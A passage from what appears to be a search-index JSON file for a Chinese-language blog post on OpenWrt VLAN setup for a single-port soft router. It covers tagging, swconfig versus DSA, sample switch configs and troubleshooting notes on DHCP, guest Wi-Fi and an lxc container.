NAME=\"eth0\"\nSUBSYSTEM==\"net\", ACTION==\"add\", DRIVERS==\"?*\", ATTR{address}==\"38:fc:98:8d:f8:7e\", NAME=\"wlan0\"\n\nupdate-initramfs -u -k all    # -u (updates initramfs), -k all(specific all kernel version)\n</code></pre>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#openwrt-vlan\u8bbe\u7f6e","title":"Openwrt VLAN\u8bbe\u7f6e","text":"<ul> <li>\u5b98\u65b9\u6587\u6863\uff1a[OpenWrt Wiki] VLAN</li> </ul>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#vlan-q--a","title":"vlan Q &amp; A","text":"<ul> <li>vlan\u4f5c\u7528\u662f\u4ec0\u4e48\uff1f\uff1a\u5206\u79bb\u4e0d\u540c\u8bbe\u5907\uff08\u4f4d\u4e8e\u540c\u4e00\u4e2aLAN\uff09\u3002\u4f18\u70b9\uff1a\u4e0d\u7528\u8bbe\u7f6e\u5b50\u7f51\u6bb5\u548c\u8def\u7531\u3002</li> <li>vlan\u6807\u51c6\uff1aIEEE 802.1Q\u3002vlan\u4f1a\u5728\u4ee5\u592a\u7f51\u5e27\u4e2d\u6dfb\u52a04\u5b57\u8282\uff0c\u56e0\u6b64\u901a\u4fe1\u53cc\u65b9\u5fc5\u987b\u8981\u90fd\u80fd\u8bc6\u522bvlan</li> <li></li> <li>\u54ea\u4e9b\u8bbe\u5907\u652f\u6301vlan\uff1f\uff1a\u57fa\u672c\u4e0a\u6240\u6709\u8bbe\u5907\u90fd\u652f\u6301vlan\uff08\u8f6f\u4ef6\u7684\u6216\u8005\u786c\u4ef6\u4ea4\u6362\u673a\uff09\u3002</li> <li>\u5bf9\u4e8e\u6709\u591a\u4e2a\u7aef\u53e3\u7684\u5d4c\u5165\u5f0f\u8bbe\u5907\uff0c\u5185\u90e8\u901a\u5e38\u4f1a\u5305\u542b\u4e00\u4e2aVLAN-capable switch\uff0c\u6216\u8005\u79f0managed switch\u3002\u7ba1\u7406\u4ea4\u6362\u673a\u548c\u8bbe\u5907\u5185\u90e8\u7684\u4e00\u4e2aethernet\u63a5\u53e3\u8fde\u63a5\u5728\u4e00\u8d77\u3002\u7ba1\u7406\u4ea4\u6362\u673a\u53ef\u4ee5\u4e3a\u6bcf\u4e2a\u7aef\u53e3\u8bbe\u7f6evlan id\uff0c\u5e76\u4e14\u53ef\u4ee5\u72ec\u7acb\u4e8eCPU\u5de5\u4f5c\u3002</li> <li>\u5bf9\u4e8ePC\u6216\u5219\u5355\u677f\u8ba1\u7b97\u673a\uff0c\u6bcf\u4e2a\u7aef\u53e3\u90fd\u6709\u4e00\u4e2a\u72ec\u7acb\u7684\u4ee5\u592a\u7f51\u63a7\u5236\u5668(nic)\uff0cvlan\u901a\u8fc7\u64cd\u4f5c\u7cfb\u7edf\u9a71\u52a8\u5b9e\u73b0\u3002</li> <li>\u5982\u4f55\u67e5\u770b\u81ea\u5df1\u8bbe\u5907\u662f\u5426\u6709\u786c\u4ef6switch\uff1f</li> <li>\u901a\u8fc7<code>ls -l /sys/class/net</code>\u53ef\u4ee5\u67e5\u770b\u7269\u7406\u7684\u7f51\u7edc\u63a5\u53e3</li> <li>\u7528\u8fc7\u7684\u5c0f\u7c73\u8def\u7531\u5668\u5747\u6ca1\u6709\u4e13\u95e8\u7684switch\u9875\u9762\uff0c\u540e\u9762\u624d\u77e5\u9053\u662f\u91c7\u7528\u4e86DSA\u67b6\u6784\uff0c\u6bcf\u4e2a\u7aef\u53e3\u90fd\u663e\u5f0f\u4e3a\u4e00\u4e2a\u8bbe\u5907\uff0c\u5982lan1, lan2, wan\u3002\u5b9e\u9645\u4e0a\u5747\u662f\u4f4d\u4e8eeth0\u4e0b\u3002</li> </ul>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#tag-untag","title":"tag, untag","text":"<p>\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u6216\u591a\u4e2avlan id\uff0c\u4e0d\u540cvlan\u5bf9\u5e94\u4e00\u4e2a\u5e7f\u64ad\u57df</p> <p>port membership\uff1a\u6bcf\u4e2a\u7aef\u53e3\u53ef\u4ee5\u5c5e\u4e8e\u4e00\u4e2a\u6216\u591a\u4e2avlan - tag: \u8be5\u7aef\u53e3\u7684\u5305\u90fd\u5e26\u6709vlan id\u3002\u7aef\u53e3\u8fde\u63a5\u7684\u5bf9\u9762\u5fc5\u987b\u662fvlan awareness\u7684 - untag: \u4ece\u8be5\u7aef\u53e3\u51fa\u53bb\u7684\u5305\u88ab\u5220\u9664\u6389vlan id\u3002\u7528\u4e8e\u548c\u975evlan\u7cfb\u7edf\u4ea4\u4e92 port PVID \u4ece\u8be5\u7aef\u53e3\u8fdb\u5165\u7684untagged\u7684\u5305\uff0c\u88ab\u5212\u5206\u4e3a\u54ea\u4e2avlan\u3002\uff08\u5982\u679c\u8be5\u7aef\u53e3\u6709untag\u7684VLAN id\uff0c\u5219\u5fc5\u7136\u5c31\u662f\u7b49\u4e8e\u8be5vlan id\u3002\u5982\u679c\u8be5\u7aef\u53e3\u5168\u90e8\u90fd\u662ftag\u7684\uff0c\u5219\u9700\u8981\u989d\u5916\u6307\u5b9a\uff09</p> <p></p> <p>\u5728Cisco\u672f\u8bed\u4e2d\uff0cuntag \u7aef\u53e3\u53eb\u505avlan port\uff0ctag\u53eb\u505atrunk port\u3002</p> <ul> <li>PVID\u5373untagged VLAN\uff0c\u6bcf\u4e2a\u7aef\u53e3\u53ea\u80fd\u6307\u5b9a\u4e00\u4e2aPVID\u3002\u8fd9\u6837\u5f53\u8be5\u7aef\u53e3\u6536\u5230untagged\u5305\u65f6\uff0c\u4fbf\u5c06\u5176\u5f52\u4e3a\u67d0\u4e2aVLAN\u57df\u3002</li> <li>untag\u63a5\u53e3\uff1a\u7528\u4e8e\u8fde\u63a5\u975evlan\u7f51\u7edc</li> <li>trunk\u63a5\u53e3\uff1a\u611f\u89c9\u6307\u7684\u662f\u8be5\u7aef\u53e3\u4e0a\u5168\u662ftagged\uff0c\u7528\u4e8e\u4e00\u6839\u7ebf\u4f20\u8f93\u591a\u4e2a\u5b50\u7f51\u3002</li> <li>tag\u548cuntag\u6df7\u5408\uff1a\u76ee\u524d\u4e0d\u77e5\u9053\u6709\u4ec0\u4e48\u4f5c\u7528</li> </ul> <p>VLANs and CPU(eth0), CPU(eth1) - Installing and Using OpenWrt / Network and Wireless Configuration - OpenWrt Forum - eth0\uff0ceth1\u542b\u4e49\uff1aswitch\u81ea\u8eab\u6709\u82e5\u5e72\u7aef\u53e3\uff08\u8def\u7531\u5668\u5916\u4fa7\u7684\u7aef\u53e3\uff09\uff0c\u5185\u90e8\u5230cpu\u6709\u4e24\u4e2a\u7aef\u53e3 - \u4e2d\u95f4\u89e3\u91ca\u4e86VLAN\u7684\u5de5\u4f5c\u8fc7\u7a0b\uff0c\u5176\u4e2dPVID\u7528\u4e8e\u5904\u7406untagged\u60c5\u51b5 - \u63a5\u7740\u89e3\u91ca\u4e86cpu\u7aef \u63a5\u53e3tag\u7684\u4f5c\u7528\uff0c\u901a\u8fc7\u6307\u5b9atag\uff0c\u4f1a\u521b\u5efa\u201c\u5b50\u63a5\u53e3\u201d(\u5982eth0.1)\uff0c\u8fd9\u6837\u6bcf\u4e2a\u5b50\u63a5\u53e3\u90fd\u53ef\u4ee5\u6709\u72ec\u7acb\u7684\u5730\u5740\u3002</p> <p>There are two places that tagging is important, leaving out \"one-armed\" configurations; in the switch and on the interface itself. The switch works by \"wiring\" all ports that have the same VLAN together. When a packet arrives at a port, if it is untagged, it is given the PVID as a tag. If it is already tagged and it is a \"permitted\" VLAN tag, it retains the tag. Depending on the specifics of the switch and its driver, if it is not a permitted tag, the packet may be dropped (I haven't seen config parameters for this behavior nor looked for it in detail). Inside the switch, if the destination MAC address is on a port that permits the VLAN, then it is sent out that port. For broadcast packets, it is sent out all ports that permit that VLAN. If the port is tagged for that VLAN, the tag is retained. If the port is untagged for that VLAN, the tag is dropped. The interface can also have tags, each of which creates a \"sub-interface\" that can be accessed by the kernel, and through the kernel user-space applications. Each sub-interface \"filters\" to that specific VLAN, and tags outgoing packets with the VLAN. Each sub-interface (or bridge over that sub-interface) typically has its own IPv4 address, and its own set of IPv6 addresses. This allows \"trunking\" where one physical wire (which may be inside of the SoC or on the PCB) handles multiple subnets or streams of data. If you're only carrying one stream of data to/from a physical interface, you don't really need to use tagging as the switch's use of PVID is sufficient. Personally, when I can, I\u00a0always\u00a0use VLAN tags for clarity and future extensibility. That said, my network infrastructure uses many VLANs for segregation of traffic, monitoring, and firewalling. If you tag both eth0 and eth1 to the same VLAN, that should be OK, as long as they don't have the same IP address. It's like plugging them both into the same Ethernet cable. Most of what you describe will \"work\" if both the interfaces and the switch are configured properly, if you only have one stream of data to/from each of the physical interfaces.</p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#\u786c\u4ef6switch-vlan","title":"\u786c\u4ef6switch vlan","text":"<p>\u4e0b\u56fe\u4e3a\u4e00\u4e2a\u5e38\u89c1\u76845\u7aef\u53e3\u8def\u7531\u5668\u7684vlan\u8bbe\u7f6e\uff0c\u8be5\u8def\u7531\u5668\u53ea\u6709\u4e00\u4e2a\u7f51\u7edc\u63a5\u53e3(eth0)\uff0c\u5305\u542b\u4e00\u4e2a\u5185\u7f6e\u7684\u4ea4\u6362\u673a\uff0c\u901a\u8fc7vlan\u5c06WAN\u548cLAN\u9694\u79bb\u3002 </p> <p>\u5bf9\u4e8eswtich\u5b9e\u73b0\u7684vlan\uff0copenwrt\u6709\u4e00\u4e2a\u9875\u9762\u7528\u4e8e\u56fe\u5f62\u5316\u5730\u8bbe\u7f6evlan\u3002\uff08\u4f7f\u7528DSA\u67b6\u6784\u540e\u5c31\u6ca1\u4e86\uff0c\u89c1\u540eDSA\u8282\uff09</p> <p></p> <ul> <li>tagged:  The\u00a0tagged\u00a0port (<code>t</code>\u00a0is appended to the port number) is the one that forces usage of\u00a0VLAN\u00a0tags, i.e. when the packet is outgoing, the\u00a0VLAN\u00a0ID tag with\u00a0<code>vlan</code>\u00a0value is added to the packet, and when the packet is incoming, the\u00a0VLAN\u00a0ID tag has to be present and match the configured\u00a0<code>vlan</code>\u00a0value(s).</li> <li>untagged:  The\u00a0untagged\u00a0port is removing the\u00a0VLAN\u00a0ID tag when leaving the port \u2013 this is used for communication with ordinary devices that does not have any clue about VLANs. When the untagged packet arrives to the port, the default port\u00a0VLAN\u00a0ID (called\u00a0<code>pvid</code>) is assigned to the packet automatically. The\u00a0<code>pvid</code>\u00a0value can be selected by the\u00a0<code>switch_port</code>\u00a0section.</li> </ul>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#\u8f6f\u4ef6vlan","title":"\u8f6f\u4ef6vlan","text":"<p>\u6bcf\u4e2a\u7269\u7406\u63a5\u53e3(nic)\u53ef\u4ee5\u901a\u8fc7vlan id\u865a\u62df\u51fa\u591a\u4e2a\u865a\u62df\u63a5\u53e3\uff08\u5982eth0.1, eth0.2\uff09\u3002\u5f53\u5305\u8def\u7531\u5230\u5bf9\u5e94\u865a\u62df\u63a5\u53e3\u65f6\uff0c\u5305\u79bb\u5f00\u7269\u7406\u63a5\u53e3\u65f6\u4f1a\u6253\u4e0a\u5bf9\u5e94tag\u3002\u5f53\u7269\u7406\u63a5\u53e3\u63a5\u6536\u5230\u5bf9\u5e94tag\u7684\u5305\u65f6\uff0c\u5219\u4f1a\u8def\u7531\u5230\u5bf9\u5e94\u865a\u62df\u63a5\u53e3\uff08\u4e0d\u5b58\u5728\u5219\u4f1adrop\uff09\u3002</p> <p>A driver-level\u00a0VLAN\u00a0could be created in the\u00a0<code>interface</code>\u00a0section by adding a dot (<code>.</code>) and the respective\u00a0VLAN\u00a0ID after the interface name (in the\u00a0<code>ifname</code>\u00a0option), like\u00a0<code>eth1.2</code>\u00a0for\u00a0VLAN\u00a0ID 2 on\u00a0<code>eth1</code>. When any internal software routing decision sends the packet to the software\u00a0VLAN, it leaves the respective interface (<code>eth1</code>\u00a0in our example) with the\u00a0VLAN\u00a0tag present and\u00a0VLAN\u00a0ID set to the number corresponding to the interface name (<code>2</code>\u00a0in our example on\u00a0<code>eth1.2</code>). if the incoming packet arrives to the interface with software VLANs (incoming packet to\u00a0<code>eth1</code>) and has a\u00a0VLAN\u00a0ID tag set, it appears on the respective software-VLAN-interface instead (VLAN\u00a0ID 2 tag arrives on\u00a0<code>eth1.2</code>) \u2013 if it exists in the configuration! Otherwise the packet is dropped. Non-tagged packets are delivered to non-VLAN\u00a0interface (<code>eth1</code>) as usual.</p> <p>\u5f53\u628anon-VLAN\u63a5\u53e3\u548cVLAN\u63a5\u53e3\u6865\u63a5\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u8d1f\u8d23\u589e\u52a0\u548c\u5220\u9664tag</p> <p>When you bridge non-VLAN\u00a0and\u00a0VLAN\u00a0interfaces together, the system takes care about adding\u00a0VLAN\u00a0ID when sending packet from non-VLAN\u00a0to\u00a0VLAN\u00a0interface, and it automatically removes the\u00a0VLAN\u00a0ID when sending packet from\u00a0VLAN\u00a0interface to non-VLAN\u00a0one.</p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#dsa\u8bbe\u7f6e","title":"DSA\u8bbe\u7f6e","text":"<p>Distributed Switch Architecture(DSA) \u662flinux kernel\u5bf9\u7f51\u7edc\u67b6\u6784\u7684\u4e00\u4e2a\u8c03\u6574\uff0copenwrt\u4ece21\u7684\u7248\u672c\u5f00\u59cb\u4f7f\u7528\u8be5\u67b6\u6784\u3002 \u53c2\u8003\uff1a - \u63a8\u8350\u4ed4\u7ec6\u89c2\u770b\uff1aVLANs in OpenWrt 21 - YouTube - \u5b98\u65b9wiki\uff1a[OpenWrt Wiki] DSA Mini-Tutorial</p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#dsa-vs-swconfig","title":"DSA vs swconfig","text":"<p>openwrt 19\u4ee5\u524d\u7248\u672c\u4f7f\u7528swconfig\uff0c\u4ece21\u7684\u7248\u672c\u5f00\u59cb\u4f7f\u7528DSA\u3002</p> <p>\u533a\u522b\u603b\u7ed3\uff1a - 21\u53ef\u4ee5\u663e\u5f0f\u5b9a\u4e49vlan device\uff08802.1q\uff09\uff0c19\u5219\u662f\u5728interface\u901a\u8fc7\u9009\u62e9device\u65f6\u624b\u52a8\u6dfb\u52a0\u540e\u7f00\uff0c\u9690\u5f0f\u914d\u7f6e\u3002 - \u6307\u5b9a\u7aef\u53e3\u6807\u7b7e\u65b9\u5f0f   - 19\u4e2d\uff0c\u4e13\u95e8\u7684switch\u9875\u9762\uff0c\u6307\u5b9a\u4e0d\u540c\u7aef\u53e3\u5982\u4f55\u6253\u6807\u7b7e   - 21\u4e2d\uff0c\u6bcf\u4e2aport\u53d8\u6210\u5355\u72ec\u4e00\u4e2adevice\uff08\u5982lan1, lan2, wan\uff09\u3002\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2abridge\u6dfb\u52a0lan1, lan2, wan\uff0c\u7136\u540e\u901a\u8fc7bridge vlan filtering\u6765\u6307\u5b9a\u4e0d\u540c\u7aef\u53e3\u7684\u6253\u6807\u7b7e\u65b9\u5f0f\u3002</p> <p>21\u603b\u7ed3 - define VLAN on the bridge - tag and untag on the bridge - attach wifi to the interface</p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#ingress-vs-egress-tagged-vs-untagged\u542b\u4e49","title":"ingress vs egress, tagged vs untagged\u542b\u4e49","text":"<ul> <li>egress tagged\uff1a\u53d1\u5f80VLAN 100\u7684\u5305\uff0c\u4f1a\u4ece\u6307\u5b9a\u7aef\u53e3\u53d1\u51fa\uff0c\u5e76\u4e14\u5728\u4ee5\u592a\u7f51\u5e27\u4e2d\u63d2\u5165tag\u3002\u9002\u7528\u4e8e\u5bf9\u9762\u4e5f\u662fvlan-aware\u8bbe\u5907</li> <li>egress untagged: \u53d1\u5f80VLAN 100\u7684\u5305\uff0c\u4f1a\u4ece\u6307\u5b9a\u7aef\u53e3\u53d1\u51fa\uff0c\u5e76\u4e14\u5728\u4ee5\u592a\u7f51\u5e27\u4e2d\u79fb\u9664tag\u3002\u9002\u7528\u4e8e\u8fde\u63a5\u666e\u901a\u8bbe\u5907\uff0c\u4e00\u4e2a\u7aef\u53e3\u53ea\u80fd\u5bf9\u5e94\u4e00\u4e2auntagged vlan\u3002</li> <li>\u5bf9\u4e8e\u5165\u7ad9\u7684\u60c5\u51b5\uff0c\u5982\u679c\u5305\u6709tag\uff0c\u5219\u76f4\u63a5\u53d1\u5f80\u5bf9\u5e94\u7684vlan\u3002\u5982\u679c\u662funtagged\u7684\uff0c\u5219\u6dfb\u52a0PVID\uff0c\u53d1\u5f80\u5bf9\u5e94vlan\u3002</li> </ul>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#swconfig\u914d\u7f6e\u5b9e\u4f8bp2w","title":"swconfig\u914d\u7f6e\u5b9e\u4f8b(p2w)","text":"<p>\u5e76\u975e21\u540e\u7684\u7248\u672c\u90fd\u4f7f\u7528\u4e86DSA\uff0c\u8fd9\u91ccp2w\u4f7f\u7528\u7684op\u7248\u672c\u4e3a22.03\uff0c\u4ecd\u7136\u6709switch\u9875\u9762\u3002</p> <p>\u8bbe\u7f6evlan\u7684\u8fc7\u7a0b\u4e3a - \u5728switch\u4e2d\u8bbe\u7f6e\u7aef\u53e3tagged, untagged\uff0c\u89c1\u56fe1   - \u56fe\u4e2dvlan100\u7684CPU\u8bbe\u7f6e\u4e86off\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u4e0d\u9700\u8981\u5904\u7406\u8be5\u90e8\u5206\u6d41\u91cf\uff08\u8be5\u90e8\u5206\u662f\u5b66\u6821\u5230\u8f6f\u8def\u7531\u865a\u62df\u94fe\u8def\uff09\u3002\u8fd9\u6837\u8bbe\u7f6e\u4e0d\u4f1a\u4ea7\u751feth0.100\u7684\u8bbe\u5907\u3002 - \u56fe2\u4e3a\u9690\u5f0f\u4ea7\u751f\u7684vlan device - \u6dfb\u52a0interface\uff0c\u6307\u5b9a\u4f7f\u7528\u7684vlan\u3002\u56fe3 mgr\u6307\u5b9a\u4e86eth0.99\uff0c\u800clan\u6307\u5b9a\u7684br-lan\u8fde\u63a5\u4e86eth0.200 \u56fe1  \u56fe2  \u56fe3  \u56fe4 </p> <p>\u4ece\u914d\u7f6e\u6587\u4ef6\u6765\u770b\uff0c\u901a\u8fc7switch_vlan\u6307\u5b9a\u4e86\u4e0d\u540c\u7aef\u53e3\u5982\u4f55\u6253\u4e0atag <pre><code>config switch\n        option name 'switch0'\n        option reset '1'\n        option enable_vlan '1'\n\nconfig switch_vlan\n        option device 'switch0'\n        option vlan '1'\n        option vid '100'\n        option ports '4 1t'\n        option description '\u5b66\u6821\u5230\u5355\u53e3\u8f6f\u8def\u7531'\n\nconfig switch_vlan\n        option device 'switch0'\n        option vlan '2'\n        option vid '200'\n        option ports '0t 3 1t'\n        option description '\u8f6f\u8def\u7531\u5230LAN'\n\nconfig switch_vlan\n        option device 'switch0'\n        option vlan '3'\n        option vid '99'\n        option description 'LAN3\u7528\u4e8e\u7ba1\u7406'\n        option ports '0t 2'\n</code></pre></p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#dsa\u914d\u7f6e\u5b9e\u4f8bax6s","title":"DSA\u914d\u7f6e\u5b9e\u4f8b(ax6s)","text":"<p>ax6s\u6709\u56db\u4e2a\u7aef\u53e3 - \u56fe1\uff0c\u5c06\u6240\u6709lan\u53e3\u6dfb\u52a0\u5230br-lan\uff08\u8fd9\u91cc\u5176\u5b9ewan\u4e5f\u53ef\u4ee5\u6dfb\u52a0\u8fdb\u6765\uff09 - \u56fe2\uff0c\u8bbe\u7f6e\u7aef\u53e3\u6807\u7b7e - \u56fe3\uff0c\u81ea\u52a8\u751f\u6210\u4e86vlan\u8bbe\u5907\uff0c\u4f46\u8fd9\u6b21\u662f\u5728br-lan\u4e0a\u751f\u6210\u7684 - \u56fe4\uff0c\u521b\u5efa\u63a5\u53e3\uff0c\u6307\u5b9a\u4e0d\u540cvlan\u8bbe\u5907   - \u8fd9\u91ccwan\u53e3\u4e13\u95e8\u7528\u4e8e\u7ba1\u7406 </p> <p></p> <p></p> <p></p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#lxc-openwrt-dnsmasq","title":"lxc openwrt dnsmasq","text":"<ul> <li>lxc\u521b\u5efaopenwrt\u5bb9\u5668\uff0c\u521a\u5f00\u59cb\u4e3a\u624b\u52a8\u521b\u5efa\u955c\u50cf\u3002\u7ed3\u679c\u542f\u52a8\u5bb9\u5668\u540e\u53d1\u73b0openwrt\u5185\u65e0\u53d1\u4e0a\u7f51\uff0c\u8fdb\u4e00\u6b65\u53d1\u73b0\u662fdnsmasq\u6ca1\u6709\u542f\u52a8\u5bfc\u81f4\u57df\u540d\u89e3\u6790\u4e0d\u4e86\u3002</li> <li>\u6309\u7167openwrt\u8bba\u575b\u4e2d\u7684\u65b9\u6cd5\u6ce8\u91ca\u6389dnsmasq\u7684\u542f\u52a8\u811a\u672c\u4e2d\u7684\u90e8\u5206\u884c\uff0c\u95ee\u9898\u89e3\u51b3\u3002Procd jail not work in lxc, dnsmasq fail to start - For Developers - OpenWrt Forum</li> <li>\u73b0\u5728lxc\u6709openwrt\u5b98\u65b9\u955c\u50cf\uff0c\u6ca1\u8fd9\u4e2a\u95ee\u9898\uff0c\u4f46\u662f\u5176lan interface\u914d\u7f6e\u7528\u7684\u8fd8\u662fifname\uff0copenwrt luci\u4f1a\u63d0\u793a\u66f4\u65b0\u3002</li> </ul> <p>log\u662f\u4e0d\u662f\u76f8\u5173</p> <p>[Tue Jul 25 17:55:09 2023] audit: type=1400 audit(1690278912.535:306): apparmor=\"DENIED\" operation=\"mount\" info=\"failed type match\" error=-13 profile=\"lxd-op1_\" name=\"/tmp/ujail-LFABnj/bin/sh\" pid=920178 comm=\"ntpd\" flags=\"ro, remount, bind\"</p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#p2w\u7684wan\u53e3\u5751","title":"p2w\u7684wan\u53e3\u5751","text":"<p>wan\u53e3\u7528\u4e8e\u7ba1\u7406\u600e\u4e48\u90fd\u4e0d\u884c\u3002\u4e00\u4fee\u6539swtich\u83dc\u5355\uff0c\u9a6c\u4e0a\u5931\u8054\u3002\u4f7f\u7528lan\u53e3\u7ba1\u7406\u6210\u529f</p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#wifi\u6302\u8f7d\u5230\u7f51\u6865\u4e0a\u624d\u80fd\u83b7\u5f97dhcp\u5730\u5740","title":"wifi\u6302\u8f7d\u5230\u7f51\u6865\u4e0a\u624d\u80fd\u83b7\u5f97dhcp\u5730\u5740","text":"<ul> <li>eth0.200\u7528\u4e8elan\uff0clan\u8bbe\u7f6edhcp client\uff0c\u4f46\u662fp2w\u83b7\u5f97\u5230\u4e86ip\uff0c\u8fde\u63a5wifi\u7684\u7b14\u8bb0\u672c\u83b7\u5f97\u4e0d\u4e86\u3002\u521b\u5efa\u4e00\u4e2a\u7f51\u6865br-lan\uff0c\u7136\u540e\u6dfb\u52a0eth0.200\u540e\u6210\u529f\u3002</li> </ul>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#guest-wifi\u65e0\u6cd5\u4e0a\u7f51","title":"guest wifi\u65e0\u6cd5\u4e0a\u7f51","text":"<p>\u5728ax6s\u4e0a\u521b\u5efa\u4e86\u4e00\u4e2aguest wifi\uff0c\u4f7f\u7528\u5355\u72ec\u7684vlan\u3002\u6700\u7ec8\u6548\u679c\u5982\u4e0b\uff1a</p> <p></p> <p></p> <p>\u4f46\u662f\u521b\u5efa\u8fc7\u7a0b\u4e2d\u4e0d\u77e5\u4e3a\u4f55guest\u663e\u5f0f\u8bbe\u5907\u4e0d\u5b58\u5728\uff0c\u4e8e\u662f\u624b\u52a8\u6dfb\u52a0\u4e86802.1q\u8bbe\u5907\uff0cvlan id\u624b\u52a8\u6307\u5b9a\u4e3a201\u3002\u8c8c\u4f3c\u6ca1\u6709\u548cbr-lan\u4e2dbridge vlan filtering\u81ea\u52a8\u521b\u5efa\u7684802.1q\u4ea7\u751f\u51b2\u7a81\u3002\u4e8e\u662f\u8bbe\u5907\u4e0d\u5b58\u5728\u7684\u95ee\u9898\u89e3\u51b3\u4e86\u3002</p> <p>\u4f46\u662fguest\u4ecd\u7136\u65e0\u6cd5\u901a\u8fc7dhcp\u83b7\u5f97ip\u3002tianyi\u7684br-guest\u4e5f\u65e0\u6cd5\u83b7\u5f97ip\u5730\u5740\uff08\u5176\u4e2d215\u662f\u624b\u52a8\u6dfb\u52a0\u7684\uff0c234\u662f\u540e\u9762\u6210\u529f\u540e\u81ea\u52a8\u83b7\u5f97\u7684\uff09\uff0ctcpdump -i br-guest\u53ef\u4ee5\u770b\u5230\u6709\u6765\u81eaax6s guest\u63a5\u53e3\u7684dhcp request\u3002</p> <p></p> <p>\u8fdb\u5165op2\uff0c\u53d1\u73b0\u4e5f\u6ca1\u6709\u751f\u6210\u5bf9\u5e94\u8def\u7531\uff0c\u800c\u662f\u5168\u90e8\u8d70192.168.36.1\uff08\u56fe\u4e2d\u7684default\u548c192.168.37.1\u662f\u540e\u9762\u81ea\u52a8\u751f\u6210\u7684\uff09\uff0c\u4e8e\u662f\u624b\u52a8\u6dfb\u52a0\u4e86\u4e00\u6761192.168.37.0/24\u7684\u89c4\u5219\u3002 <pre><code>default via 192.168.36.1 dev br1 proto dhcp src 192.168.36.215 metric 100\ndefault via 192.168.37.1 dev br-guest proto dhcp src 192.168.37.234 metric 100\n\n192.168.37.0/24 dev br-guest proto kernel scope link src 192.168.37.215\n192.168.37.1 dev br-guest proto dhcp scope link src 192.168.37.234 metric 100\n</code></pre></p> 